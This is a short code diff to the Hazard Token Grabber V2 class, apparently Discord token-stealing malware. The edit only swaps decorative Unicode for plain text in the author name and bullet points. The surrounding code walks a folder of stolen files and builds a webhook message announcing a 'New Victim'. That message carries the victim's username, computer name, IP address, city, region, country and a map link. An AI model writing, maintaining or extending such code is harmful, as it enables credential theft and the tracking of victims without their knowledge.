@@ -211,7 +211,7 @@ class Hazard_Token_Grabber_V2:
         self.zip(temp, new)
         for dirname, _, files in os.walk(self.tempfolder):
             for f in files:
-                self.files += f"\n・{f}"
+                self.files += f"\n*{f}"
         n = 0
         for r, d, files in os.walk(self.tempfolder):
             n+= len(files)
@@ -221,11 +221,11 @@ class Hazard_Token_Grabber_V2:
             "embeds": [
                 {
                     "author": {
-                        "name": "𝑯𝒂𝒛𝒂𝒓𝒅 𝑻𝒐𝒌𝒆𝒏 𝑮𝒓𝒂𝒃𝒃𝒆𝒓.𝑽2",
+                        "name": "Hazard Token Grabber.V2",
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                         "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
                     },
-                    "description": f"𝗡𝗲𝘄 𝘃𝗶𝗰𝘁𝗶𝗺 𝘁𝗼 𝑯𝒂𝒛𝒂𝒓𝒅 𝑻𝒐𝒌𝒆𝒏 𝑮𝒓𝒂𝒃𝒃𝒆𝒓.𝑽2\n```fix\nUsername: {os.getlogin()}\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "description": f"New Victim to Hazard Token Grabber.V2\n```fix\nUsername: {os.getlogin()}\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                     "color": 16119101,
 
                     "thumbnail": {
